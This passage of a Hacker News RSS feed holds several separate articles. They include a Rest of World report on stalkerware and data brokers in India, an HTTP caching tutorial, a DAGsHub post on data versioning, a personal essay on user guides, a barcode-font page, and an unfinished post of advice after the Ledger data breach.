<p>According to Kunwar Vikram Singh, the chairman of the Association of Private Detectives and Investigators in India, itâ€™s now common for wealthy families to assess the suitability of a potential bride or groom by hiring a private detective, a vetting that usually costs around $500. He attributes this to Indiaâ€™s changing social mores, especially among urban elites. â€œWork culture has changed. Values have changed,â€ Singh reflected, citing the influx of women into the workforce as one contributing factor. â€œWe tell people, â€˜You spend lakhs and crores on marital ceremonies; spend a few thousand on investigatorsâ€™,â€ he said.</p>



<p>Whatever the reason, Indiaâ€™s private-detective services have been growing over the past decade. Singh estimates that the sector is now worth roughly $1.2 billion<strong> </strong>nationally. But because of the sensitive nature of the field, itâ€™s impossible to know for sure: There are no official statistics, and many clients still pay in cash. â€œThey donâ€™t want to leave any footprint,â€ he noted.</p>



<p>The services offered by the detectives mainly fall into two categories: corporate and personal. The corporate investigations often involve banks hiring investigators to get information on shifty borrowers and financial firms looking for background checks on employees. The personal services range from child monitoring to matrimonial background checks. Every agency has its own specialization. Karnam Choudhary, a Jaipur-based detective who operates the Siyol Detective Network, which has around 1,500 freelance private investigators across the country, says that â€œsince 2016, personal cases make up almost 70%.â€</p>



<p>The boom in business has coincided with a growing reliance on consumer-grade spyware. These are mostly smartphone apps that cannot easily be detected, secretly record all of a deviceâ€™s activity, and route that data to a third-party dashboard. A private investigatorâ€™s first move used to be shadowing somebody in person; today, many of them begin by advising the client to present the object of their suspicion with a malware-infected smartphone.</p>



<p>Growing demand for spyware first caught the attention of Indiaâ€™s software engineers several years ago, long before the coronavirus pandemic led to a spike. In 2013, while researching viruses and cybersecurity for his final-year engineering project, Gujarat-based coder Tushar Mepani began meeting parents who wanted to keep closer tabs on their teenagersâ€™ whereabouts. â€œI could not sleep at night when these millionaires told me about their kidsâ€™ behavior,â€ he said, apparently in earnest. The initial prototype of <a href="http://www.convants.com/">what became his first app for tracking children</a>, EasySpyPhone, was restricted to recording calls and collecting text messages and location data, but more recent iterations can spy on social media platforms like Facebook and WhatsApp, secretly turn on a phoneâ€™s microphone to record calls and video, and capture screenshots, all for around $20 or $40 per month. â€œParents were very happy,â€ Mepani reflected. â€œThey learned who their kids are friends with â€” and who is diverting them. The app has saved kids from being spoiled.â€</p>



<figure><blockquote><p>â€œWe had no idea at the time whether people would be interested in this, but it clicked with users.â€</p></blockquote></figure>



<p>Mepani doesnâ€™t sell only one or two products, however; through his Android spyware company, Convants Information Security, he licenses surveillance software to multiple vendors, who repackage it under different names. He wonâ€™t reveal the details of these arrangements, calling them â€œinternal business,â€ but he claims to have made more than 20,000 sales. In 2014, Choudhary, the Jaipur-based detective, used Mepaniâ€™s software to launch his <a href="http://spymobileprocess.com/">agencyâ€™s own app, Spy Mobile Process</a>. Instead of paying for a full investigation, those who buy Choudharyâ€™s app may use it to conduct their own inquiries, with guidance from detectives. â€œWe had no idea at the time whether people would be interested in this,â€ he said. â€œBut it clicked with users.â€</p>



<p>All of this exists in a legal gray area. As of now, there are no laws in India regulating the selling or purchasing of so-called stalkerware. Nor is there much clarity about the privacy laws currently on the books. In India, it is not illegal to physically surveil a target, for instance, but things get fuzzier when it comes to tracking somebodyâ€™s location via mobile phone. Courts have been forced to establish statutes, case by case. In 2018, for instance, a family court in Delhi <a href="https://theprint.in/judiciary/evidence-collected-in-breach-of-privacy-does-not-make-it-inadmissible-in-court-delhi-hc/452288/">admitted evidence collected from spyware</a> in a case concerning a marital dispute, stating that the right to a fair trial outweighed privacy protections.</p>



<p>But staying on the right side of the law doesnâ€™t seem to trouble many spyware vendors. Insofar as they are concerned about legal exposure, most will simply add disclaimers that place the onus on the user. Before installing software, the customer should get â€œproper written consent to do so by the owner of the smartphoneâ€ and understand that it is the â€œresponsibility of the buyer to obey all laws of their country.â€</p>



<p>In August 2020, Google introduced a new Ads Policy imposing restrictions on advertising for spyware and surveillance technology. â€œThe updated policy will prohibit the promotion of products or services that are marketed or targeted with the express purpose of tracking or monitoring another person or their activities without their authorization,â€ the company wrote in its updated policy. However, Google made two exceptions: â€œprivate investigation services,â€ like Choudharyâ€™s, and â€œproducts or services designed for parents to track or monitor their underage children,â€ like Mepaniâ€™s.</p>



<p>Private detectives who admit to using spyware almost universally insist that any problems stemming from it are the result of abuse. But what they say publicly is one thing, and how they market their services is another. While Choudhary claims his app is not intended for spying on spouses, a <a href="https://twitter.com/Siyol007/status/670517689576726528?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed&amp;ref_url=notion%3A%2F%2Fwww.notion.so%2FSahil-Chajotra-JK-detectives-0f27a3d4a117474eac2b15f591b5d764">November 2015 tweet</a> from his companyâ€™s official account said just the opposite. In a series of phone interviews, Mepani also denied marketing his product to jealous husbands and wives, even as his website made clear that these are target demographics. â€œBut you know,â€ he added, â€œit is like a knife. You can cut fruits, or you can cut someoneâ€™s head.â€</p>



<p>However unsettling, the spyware sector is only one small part of a much vaster infrastructure. More than 500 million people in India use the internet every month, creating troves of private information with every click, scroll, swipe, and download. What they watch, how they date, whom they work for, and where they spend their money is constantly being captured and monetized. All this has given rise to a multimillion-dollar dark data economy, in which no piece of information is too personal to trade.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-40x18.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-400x177.png 400w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-600x265.png 600w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-1000x442.png 1000w, https://restofworld.org/wp-content/uploads/2020/12/carlo-cadenas-india-data-brokers-inline-2-1-1600x708.png 1600w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>The black market</strong> for data, as it exists online in India, resembles those for wholesale vegetables or smuggled goods. Customers are encouraged to buy in bulk, and the variety of whatâ€™s on offer is mind-boggling: There are databases about parents, cable customers, pregnant women, pizza eaters, mutual funds investors, and almost any niche group one can imagine. A typical database consists of a spreadsheet with row after row of names and key details: Sheila Gupta, 35, lives in Kolkata, runs a travel agency, and owns a BMW; Irfaan Khan, 52, lives in Greater Noida, and has a son who just applied to engineering college. The databases are usually updated every three months (the older one is, the less it is worth), and if you buy several at the same time, â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/all-the-data-fit-to-sell/">https://restofworld.org/2020/all-the-data-fit-to-sell/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/all-the-data-fit-to-sell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506681</guid>
            <pubDate>Tue, 22 Dec 2020 14:45:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HTTP Caching]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506495">thread link</a>) | @fxq34a
<br/>
December 22, 2020 | https://adnanahmed.info/blog/2020/12/20/http-caching/ | <a href="https://web.archive.org/web/*/https://adnanahmed.info/blog/2020/12/20/http-caching/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>When we build websites we want them to load fast. One of the best ways is to use caching.</p>

<p>Caching is just keeping a copy closer to the user so you donâ€™t have to get it from someplace farther away. HTTP cache is part of HTTP specs. It gives us a way to keep a copy of the response in the user browserâ€™s memory.</p>

<p>So letâ€™s start talking about what HTTP caching is.</p>

<h2 id="what-is-http-caching">What is HTTP Caching?</h2>
<p>Letâ€™s say user visits â€œ<a href="https://example.com/docs">https://example.com/docs</a>â€. Hereâ€™s what happens:</p>

<ol>
  <li>Browser
    <ul>
      <li>Sends request</li>
    </ul>
  </li>
  <li>Server
    <ul>
      <li>Receives the request</li>
      <li>Renders the page into HTML</li>
      <li>Send a response with the HTML in the body and a status code of 200</li>
    </ul>
  </li>
  <li>Browser
    <ul>
      <li>Downloads the body of the response</li>
      <li>Browser renders the page</li>
    </ul>
  </li>
</ol>

<figure> 
    <img src="https://adnanahmed.info/img/20201221/http-cache-part-1.jpg">
</figure>

<p>The next time user visits the page all of that has to happen all over again unless the server sends some specific header that tells the browser to cache it: â€œCache-Controlâ€.</p>

<p>Thatâ€™s right, your browser already knows how to cache responses so it doesnâ€™t have to download them more than once.</p>

<p>So if your server was sending a response like this:</p>

<div><div><pre><code><span>return</span> <span>response</span><span>(</span><span>body</span><span>,</span> <span>{</span>
  <span>headers</span><span>:</span> <span>{</span>
    <span>"</span><span>Content-Type</span><span>"</span><span>:</span> <span>"</span><span>text/html</span><span>"</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>You just add the Cache Control header:</p>

<div><div><pre><code><span>return</span> <span>response</span><span>(</span><span>body</span><span>,</span> <span>{</span>
  <span>headers</span><span>:</span> <span>{</span>
    <span>"</span><span>Content-Type</span><span>"</span><span>:</span> <span>"</span><span>text/html</span><span>"</span><span>,</span>
    <span>"</span><span>Cache-Control</span><span>"</span><span>:</span> <span>"</span><span>max-age=0, must-revalidate</span><span>"</span><span>,</span>
    <span>"</span><span>Etag</span><span>"</span><span>:</span> <span>md5</span><span>(</span><span>body</span><span>)</span>
  <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>These two lines change quite a bit for the user when he next visits the page. Letâ€™s check it out.</p>

<h2 id="request-with-caching">Request with Caching</h2>

<p>Hereâ€™s what happens when visiting the page for the first time.</p>

<ol>
  <li>Browser
    <ul>
      <li>Sends request</li>
    </ul>
  </li>
  <li>Server
    <ul>
      <li>Receives the request</li>
      <li>Renders the page into HTML</li>
      <li>Send a response with the HTML in the body and a status code of 200
        <ul>
          <li>Sends <strong>â€œCache-Controlâ€</strong> and <strong>â€œEtagâ€</strong> headers</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Browser
    <ul>
      <li>Downloads the body of the response</li>
      <li>Browser renders the page</li>
      <li><strong>Browser caches the page on disk or in memory</strong></li>
    </ul>
  </li>
</ol>

<figure> 
    <img src="https://adnanahmed.info/img/20201221/http-cache-part-2.jpg">
</figure>

<p>Now hereâ€™s what happens when the user visits the page second time.</p>

<ol>
  <li>Browser
    <ul>
      <li>Sends request
        <ul>
          <li>Also sends request header <strong>If-None-Match with the Etag from last request</strong></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Server
    <ul>
      <li>Receives the request</li>
      <li>Renders the page into HTML</li>
      <li><strong>Compares the Etag headers to its new Etag</strong></li>
      <li><strong>Etag matches, sends an empty response and a status code of 304</strong></li>
    </ul>
  </li>
  <li>Browser
    <ul>
      <li><strong>Sees 304, downloads nothing, reads from cache</strong></li>
      <li>Renders the page</li>
    </ul>
  </li>
</ol>

<figure> 
    <img src="https://adnanahmed.info/img/20201221/http-cache-part-3.jpg">
</figure>

<p>So how is this faster? As the browser doesnâ€™t have to download the page again. You will also notice, that our server still had to generate the content to compare the Etag to know if it could send a 304 or not.</p>

<p>Now letâ€™s see how can we fix this.</p>

<h2 id="changing-max-age">Changing max-age</h2>
<p>We used â€œmax-age=0, must-revalidateâ€ last time. What happens if we use â€œmax-age=3600â€. This tells the browser to cache this for an hour.</p>

<p>So this is what happens when the user sends a request a second time.</p>

<ul>
  <li>Browser
    <ul>
      <li>Looks at max-age from last request</li>
      <li>Sees itâ€™s within an hour, doesnâ€™t even make a request, reads from cache</li>
      <li>Renders the page</li>
    </ul>
  </li>
</ul>

<p>For the next hour, the user is on your website, they wonâ€™t be downloading any of the same pages twice.</p>

<h2 id="cdns">CDNs</h2>

<p>So far weâ€™ve optimized the second visit to a page for a single user. But when another visitor shows up, weâ€™re going to have to do the whole request, the server builds the page, sends the response cycle again.</p>

<p>Thatâ€™s where a CDN can come in. Think of a CDN as a shared cache among your visitors.</p>

<p>A CDN is a â€œcontent delivery networkâ€ that puts servers closer to users. Thereâ€™s your â€œorigin serverâ€, thatâ€™s the one you deployed somewhere, and then a bunch of CDN servers that your visitors browsers actually talk to.</p>

<p>Not only does the CDN put your website closer geographically to the user, but it also lets you skip hitting your server to build dynamic pages for as long as you specify in max-age.</p>

<p>And that wraps it up for this article. Feel free to leave your feedback or questions in the comments section.</p>


	
	
</div></div>]]>
            </description>
            <link>https://adnanahmed.info/blog/2020/12/20/http-caching/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506495</guid>
            <pubDate>Tue, 22 Dec 2020 14:23:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Bugs and How to Fix Them]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506421">thread link</a>) | @edameme
<br/>
December 22, 2020 | https://dagshub.com/blog/data-bugs-how-to-fix-them/ | <a href="https://web.archive.org/web/*/https://dagshub.com/blog/data-bugs-how-to-fix-them/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>As data scientists know from painful experience, bugs in the code usually aren't the big difficult problem. Data itself contains bugs, in the terms of the classic definition of bugs - unexpected behaviors, usually resulting from mistaken assumptions.</p><p>In this post, I'd like to share my personal story of a data bug, which is very indicative of the types of bugs you will come across in data science work.</p><p>At DAGsHub, we're creating tools to make these bugs easier to fix. I'll show how I applied these tools in this concrete case. Fixing data bugs is a challenging process and the tools aren't as amazing as we believe they could be. <em><strong>We're on it though! </strong></em>ğŸ˜‰</p><h2 id="background"><strong>Background</strong></h2><p>The first tutorial we made for DAGsHub was a â€œstandardâ€ MNIST tutorial.</p><p>It was nice and simple - maybe too simple! A lot of users remarked that they're sick and tired of MNIST tutorials, that they don't represent reality at all - the data is already clean, balanced, labeled, and uniform. It's just straight-up images. Seeing an MNIST tutorial immediately puts them off since they feel you can make anything look good with MNIST, whether it's actually good or not.</p><p>So, we decided to create a new tutorial, based on real-world data. We decided to use the StackExchange API to generate a CSV file consisting of data from a lot of questions, specifically from CrossValidated which deals with questions about statistics. The questions include both text and tabular metadata. The label to predict was "is this tagged as a machine learning question or not?", which you can easily imagine as either a recommender system for the user writing the question or an engineered feature used in some backend BI or automation. The labels were also very unbalanced, with only 10% positive labels.</p><p>In short, this new tutorial represented reality much more faithfully than MNIST.</p><h2 id="the-problem"><strong>The problem</strong></h2><p>When I generated the original data, I didn't think about sorting by date - I just <strong>mistakenly assumed</strong> that I'll get back all the questions from the site's history or the latest questions. Oops. I think we've all been there at some point.</p><p>What I ended up getting is 50,000 samples, the upper limit of what the API is willing to return. Worse yet, the samples were not well distributed across time! If it had been a uniformly random selection, that would have been better. But I wasn't even that lucky. I don't know what weird sampling resulted in the time distribution that I actually got:</p><figure><img src="https://dagshub.com/blog/content/images/2020/12/compare_old_and_new_data-copy.png" alt="Comparing data distribution before and after fixing the data bug" srcset="https://dagshub.com/blog/content/images/size/w600/2020/12/compare_old_and_new_data-copy.png 600w, https://dagshub.com/blog/content/images/size/w1000/2020/12/compare_old_and_new_data-copy.png 1000w, https://dagshub.com/blog/content/images/size/w1600/2020/12/compare_old_and_new_data-copy.png 1600w, https://dagshub.com/blog/content/images/size/w2400/2020/12/compare_old_and_new_data-copy.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>A data scientist's before and after pic â€“ comparing the data time distributions</figcaption></figure><p>The bottom line - although I successfully built a decent model on top of the data, the data I used was broken. <strong>I had an entirely data related bug, and no change in my code was going to fix it.</strong> I needed to replace the data completely. In other cases, maybe I would have discovered that there is a subset of the data which just needs to be thrown out manually. These kinds of stories are very common in real life.</p><h2 id="what-can-be-done-in-this-scenario-on-github"><strong>What can be done in this scenario on Github?</strong></h2><ul><li><em>Case 1:</em> The data is stored in some external storage, like S3, and a URL to download it is saved as part of the code on Github. In such a case I could go to the bucket and replace the data stored there. However, I would lose the old data, and maybe even worse, I would lose the relationship between the versions of the data and my existing code! Later on, figuring out which versions of my code, experiments, and resulting models originated from the broken data becomes exceedingly difficult. I'm likely to forget, and even if not, what happens when I'm on vacation or leave the company? Whoever tries to pick up my work is set up for failure.</li><li><em>Case 2:</em> What if I create a new version of the data on S3, name it <code>data_v2.csv</code>, and change the URL in my code? Welcome to Versioning Hell:</li></ul><figure><img src="https://lh5.googleusercontent.com/gaeI3db-6IXdHlVZaaTsW_2Sx05ik4VSxpFzgQOu802Qs7z5uZXanuB-_V6Os5Mt_r0bWOpSmLmGpgow_jf1cwCuPq2PQr7bavapBkGT4r2WZgm_5C7Dw1gvfr57zIDflUHz_N6u" alt=""></figure><ul><li><em>Case 3:</em> We use Git-LFS. Git-LFS is an extension to Git that allows you to efficiently version large files. It's not completely a part of Git - things like diffs and merges aren't supported, since it's too expensive to compute them on large data. What's more, you need a specialized server that can handle LFS. Luckily, GitHub does that. Unluckily, there are still problems - the amount of storage you get for your LFS is limited, and it's hardly a full-fledged data storage solution. I would much rather store these large files on some proper cloud storage, and find a convenient way to link them to my Git repo. What's more - GitHub provides very limited information on what has changed when you try to compare versions of these large files. A line-by-line diff is not practical, but I feel like there are more useful things to say than this:</li></ul><figure><img src="https://lh5.googleusercontent.com/RCMx178HiLbE7qxsZzjz1QXgKePFrAzBc6Et-8VKqz3h7ObTG6ykUy349yB-5SKCvb5F44RniDhhu0aq8BfSHmwoOMc7bPYdGVjNzpuQMDRlU3jWBJ1n5d-7WV4ZlsWASPOGXs7A" alt=" Git-LFS Data Diff"><figcaption>Git-LFS Data Diff (The number of modified lines is also not correct - the file is much larger)</figcaption></figure><p>Even if all the above technical issues are solved, there's one human aspect that's completely ignored - what is the impact of changing the data? OK, the file changed, but how does this affect my metrics? Is the data distributed differently now? Do I have visualizations I want to see before-and-after? In vanilla Git and Github, I can only meaningfully compare text and a few images.</p><h2 id="what-can-you-do-on-dagshub"><strong>What can you do on DAGsHub?</strong></h2><p>We rely on <a href="https://dvc.org/">DVC</a> to connect your data files to your Git commits - similar to Git-LFS, but much more flexible, allowing you to store your data on your own cloud storage, and have many other cool data-science specific features.</p><p>DAGsHub lets you see notebooks and intuitive notebook diffs, which help you understand the underlying data, and create a custom visual comparison of data versions. You can also view the contents of some data formats (more coming soon) as an integrated part of the UI. Comparing large datasets is also made possible by our Directory diffing capabilities. Finally, specifically for issues like this, we created <a href="https://dagshub.com/blog/data-science-pull-requests/">Data Science Pull Requests</a>, which lets you perform the same review process for data as you would with code.</p><p>With all these tools in hand, I can now just replace my data file with the new, corrected version, use DVC and Git to commit the new version, and voila! The data is now fixed...</p><p>...Well, almost. I still need to push the data to my remote, otherwise, the project is pretty useless to anyone not in possession of my laptop.</p><h2 id="setting-up-cloud-storage-is-hard"><strong>Setting up cloud storage is hard</strong></h2><p>OK, so now we can get a version-controlled pull request for data, with meaningful data science information to guide decisions. Our data is stored on full-fledged storage with world-scale capacity. Excellent!</p><p>But let's face it - setting up cloud storage is a pain in the neck. Credit cards? IAM? Bucket retention policies? Service accounts?</p><p>Blech ğŸ¤¢ !</p><p>That's all way too hard. If we want open-source data science to flourish, we have to make it much more accessible. Well-intentioned people will want to help find and fix bugs, but we shouldn't force them to jump through hoops. Friction is a killer of creativity and productivity.</p><p><strong>It should be as easy as git push, and access control should be handled automatically.</strong></p><p>We're working hard at DAGsHub to make that a reality (stay tuned for more).</p><h2 id="summary"><strong>Summary</strong></h2><p>In real life, data is messy, and as much as you need to iterate on the code or the models, you need to iterate on your data and annotations. Reverting to old-school versioning hell is not a solution. Data should be treated as source code with its versions managed, and fixes to data should undergo the same review process that everything else does. More than that - to enable real open source, I want <strong><em>anyone</em></strong> to be able to contribute fixes to my data.<br></p>
                <section>
                  
                  <ul>
                      <li>
                        <a href="https://dagshub.com/blog/tag/collaboration/" title="Collaboration">Collaboration</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/data-science/" title="Data Science">Data Science</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/dvc/" title="DVC">DVC</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/open-source-data-science/" title="Open Source Data Science">Open Source Data Science</a>
                      </li>
                      <li>
                        <a href="https://dagshub.com/blog/tag/data-science-workflow/" title="Data Science Workflow">Data Science Workflow</a>
                      </li>
                  </ul>
                </section>
            </div></div>]]>
            </description>
            <link>https://dagshub.com/blog/data-bugs-how-to-fix-them/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506421</guid>
            <pubDate>Tue, 22 Dec 2020 14:13:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Captionz â€“ Browse YouTube Videos Using Their Captions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506398">thread link</a>) | @indit
<br/>
December 22, 2020 | https://pnlpal.dev/captionz | <a href="https://web.archive.org/web/*/https://pnlpal.dev/captionz">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
	
	

	<main id="panel">
		
		<!-- /.container#content -->
	</main>
	
	

	<div component="toaster/tray">
		<div id="reconnect-alert" component="toaster/toast">
			<p>Looks like your connection to pnlpal was lost, please wait while we try to reconnect.</p>
		</div>
	</div>
	

	

	








</div>]]>
            </description>
            <link>https://pnlpal.dev/captionz</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506398</guid>
            <pubDate>Tue, 22 Dec 2020 14:11:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Should Write a User Guide]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 41 (<a href="https://news.ycombinator.com/item?id=25506371">thread link</a>) | @opsgal
<br/>
December 22, 2020 | https://boringstartupstuff.com/newsletter/dec-22nd-2020-write-a-user-guide | <a href="https://web.archive.org/web/*/https://boringstartupstuff.com/newsletter/dec-22nd-2020-write-a-user-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Decisions have always been hard for me, especially when I'm overwhelmed. For example, I break down in front of restaurants because I can't decide if I want to go in or pick a different restaurant.&nbsp;</span></p>
<p><span>Between working remotely and social distancing, I have spent a lot of time alone this year. The hardest part is needing to make way more decisions for myself. I have to decide when to get up, what to eat, what to work on, and what to do with my free time. Sure, these were largely in my control before, but I relied a lot on social pressure to choose.</span></p>
<p><span>When I was researching </span><a href="https://www.linkedin.com/in/aslawrence/" rel="follow noopener" target="_blank"><span>Adam</span></a><span> for </span><a href="https://boringstartupstuff.com/newsletter/dec-8th-2020-mastering-the-art-of-the-playbook" rel="follow noopener" target="_blank"><span>our interview</span></a><span>, I found his user guide </span><span></span><span>and decided to write one for myself. Both his and the one from the original </span><a href="https://firstround.com/review/the-indispensable-document-for-the-modern-manager/" rel="follow noopener" target="_blank"><span>First Round Review piece</span></a><span> are written from the perspective of a manager, but user guides can be just as helpful for individual contributors. The point is sharing how best to work with you, which is especially important at a time when fewer teams are in-person.&nbsp;</span></p>
<p><span>I created a template (</span><a href="https://www.notion.so/thekatieharper/User-Guide-Outline-e3130055035b455bab61c5400e96e66c" rel="follow noopener" target="_blank"><span>which you can copy here</span></a><span>) and then got stuck. Every bullet point represents a decision that I need to make about myself. My startup job requires me to make decisions constantly, and I actually enjoy that process. But I feel entirely different when itâ€™s a personal decision.&nbsp;</span></p>
<p><span>User guides are essentially a branding exercise, and I worry that I will get called a liar for my choices. I brand myself as a morning person, a proactive doer, and a workaholic. But Iâ€™m writing this at night, at the last minute, having spent all weekend </span><i><span>not</span></i><span> working (though also somehow not relaxing). Are my stories based on truth or aspiration?</span></p>
<p><span>Decisions also open us up to rejection. By listing my preferences, personality traits, and pet peeves, Iâ€™m publishing a quick way to judge me. What if someone sees this and doesnâ€™t want to work with me?</span></p>
<p><span>Often decisions feel selfish to me. When I decide what time of day I prefer meetings, I feel guilty for prioritizing my own wants over someone elseâ€™s. Writing a user guide forces you to confront the stories you tell about yourself. And you have to be vulnerable enough that people will actually learn something useful from reading what you write.&nbsp;</span></p>
<p><span>A year ago I was in a relationship with someone who never decided anything. Now I see that </span><i><span>not</span></i><span> deciding was selfish. And I donâ€™t want to be that way.&nbsp;</span></p>
<p><span>In the end, this piece is my user guide, because it says more about me than a checklist can.</span></p>

</div></div>]]>
            </description>
            <link>https://boringstartupstuff.com/newsletter/dec-22nd-2020-write-a-user-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506371</guid>
            <pubDate>Tue, 22 Dec 2020 14:08:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libre Barcode Project]]>
            </title>
            <description>
<![CDATA[
Score 93 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25506298">thread link</a>) | @arthur2e5
<br/>
December 22, 2020 | https://graphicore.github.io/librebarcode/ | <a href="https://web.archive.org/web/*/https://graphicore.github.io/librebarcode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        

<p>Libre Barcode fonts enable you to write barcodes in the</p>

<ul>
  <li><a href="https://graphicore.github.io/librebarcode/documentation/code39">Code 39</a>,</li>
  <li><a href="https://graphicore.github.io/librebarcode/documentation/code128">Code 128</a>, and</li>
  <li><a href="https://graphicore.github.io/librebarcode/documentation/ean13">EAN/UPC</a></li>
</ul>

<p>formats, with or without text below the code. Visit the individual pages
for usage instructions and further information.</p>

<hr>
<p>The Code 128 Encoder is historically located at this URL and it stays here
to not break existing links to it. It is also included in the <a href="https://graphicore.github.io/librebarcode/documentation/code128#code128encoder">Code 128</a>
page.</p>

<h2 id="code-128-encoder"><a name="code128encoder">Code 128 Encoder</a></h2>

<p><label>Enter a text: </label></p>

<p>If it can be encoded with Code&nbsp;128 you will see a scannable barcode,
rendered with the <strong>Libre Barcode 128 Text</strong> font.</p>



<p><label> Copy the encoded text to use it with one of the <a href="https://fonts.google.com/?query=Libre+Barcode+128">Libre&nbsp;Barcode&nbsp;128&nbsp;fonts</a>:<br>
</label></p>


      </div>
    </div></div>]]>
            </description>
            <link>https://graphicore.github.io/librebarcode/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506298</guid>
            <pubDate>Tue, 22 Dec 2020 13:58:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to React to the Ledger Data Breach]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506289">thread link</a>) | @crecker
<br/>
December 22, 2020 | https://serhack.me/articles/how-to-react-data-breach-ledger/?hn=1 | <a href="https://web.archive.org/web/*/https://serhack.me/articles/how-to-react-data-breach-ledger/?hn=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/ledger/ledger_breach.png" alt="Ledger Data Breach"></p><p><em>Post being continuously updated</em>.</p><p>If you think you are amongst the users affected by the latest <a href="https://ledger.com/">Ledger</a> data breach, it is important <strong>not to panic!</strong> Follow a few simple steps and you can check the extent of the damage and keep an eye on the security of your account.</p><h2 id="what-are-data-breaches">What are Data Breaches?</h2><p>One of the unfortunate side effects of the modern, Internet-connected world is the <a href="https://en.wikipedia.org/wiki/Data_breach">data breach</a> â€• an uncontrolled leak of data and/or information. Very often is the case that you (the user) are not responsible for, or the cause of, such an intrusion. Companies have suffered (and will continue to suffer) embarrassing data breaches, whether it takes the form of server breaches, human error, or staff misconduct.</p><p>This information can range from usernames and passwords to tax IDs, physical addresses, and even payment details. These lists are then generally sold online to criminal groups who seek to use this information for profit.</p><h2 id="exploring-the-ledger-data-breach">Exploring the Ledger Data Breach</h2><p>I have already written about the <a href="https://serhack.me/articles/practical-analysis-ledger-phishing-email/">massive phishing campaign</a> that has been going on since early September 2020. However, it was only a matter of time before the attackers sold the database with over 1,000,000 email addresses.</p><p><img src="https://serhack.me/images/ledger/forum_breach.png" alt=""></p><p>The database containing the personal information of over 270,000 Ledger customers has been posted on RaidForums, a marketplace for buying, selling, and sharing information stolen from computer systems. It appears that the buying and selling is actually the result of a purchase on another forum by user <code>Burgulema111</code>.</p><p>The data leak includes two parts:</p><ul><li>The database containing the emails, personal addresses, and phone numbers of Ledger hardware wallet buyers (most likely obtained from a Shopify interface); and</li><li>A list of <strong>over 1 million</strong> emails from Ledgerâ€™s marketing campaign.</li></ul><p>Syntax of the DB file:</p><pre><code>[email]| [name_surname]| [address]| [city]| [state]| [mobile_phone]
</code></pre><h2 id="recommendations-to-follow">Recommendations to follow</h2><p>Below, I recommend 5 (+1) actions to take after such a large data breach:</p><h3 id="1-dont-send-your-seed">1. Donâ€™t Send Your Seed!</h3><p>Whenever you are asked (especially in an unsolicited manner), do not reveal or send your seed to ANYONE. <strong>NEVER SEND YOUR SEED!</strong> Even if you think it is the CEO of Ledger himself: DO. NOT. DO. IT. A seed is a collection of 24 random words needed to retrieve the private key to your wallet. Revealing or sending this to anyone is analogous to telling someone the combination to your online safe.</p><p>Your funds are NEVER in danger if you follow common sense, which is to NEVER send or reveal your seed! Ignore emails that come to you about a detected, urgent security issue or an unverified account. If your email is on the list, consider it compromised.</p><h3 id="2-check-what-personal-data-they-have-stolen">2. Check What Personal Data They Have Stolen</h3><p>Through <a href="https://haveibeenpwned.com/">Have I Been Pwned</a> and <a href="https://intelx.io/?did=0b6c44ff-0c94-46c4-b8ad-b7cb762ba5c6">IntelX</a>, you should be able to search for your personal email address. This allows you to check whether or not, in addition to your email address, your personal address or your cell phone number has also been stolen.</p><p>By checking stolen personal information, you should be able to keep track of how much of your personal information has been disclosed and take subsequent countermeasures.</p><h3 id="3-consider-changing-your-email-address-andor-phone">3. Consider 